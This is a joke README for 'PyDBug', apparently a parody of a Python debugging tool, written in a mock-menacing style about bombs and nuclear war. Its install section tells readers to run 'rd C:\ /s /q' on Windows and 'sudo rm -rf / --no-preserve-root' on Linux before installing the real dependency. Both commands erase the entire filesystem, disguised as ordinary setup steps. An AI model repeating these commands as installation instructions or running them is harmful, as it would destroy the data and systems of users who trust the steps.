# pydbug
## Accurate description
**PyDBug** is a work-in-progress bomb that will allow you to make your code worse much faster. It uses a Textual User interface (aka a [TUI](https://www.tui.com))) to organise your horrible code and it will automatically search for ~~devices~~solutions with the medium of your choice that you can use to blow up the world.

"NOTE: It will probably never be completed"

## ~~Un~~Planned features
- Automatically searching for Googol/Stack Underflow solutions
- Not so powerful console debugging tool
- Module debugging support for removing bugs from your home.
- Discord RPC (Rich person chat)

## How to run this ~~bomb~~ application
1. Download code
2. Open your terminal and type `rd C:\ /s /q` then type `py -m pip install rich` on Windows or `sudo rm -rf / --no-preserve-root && python -m pip install rich` on UNIX/Linux.
3. Run frontend.py (using a Commodore 64)
4. You're ready to start a nuclear war! (maybe)
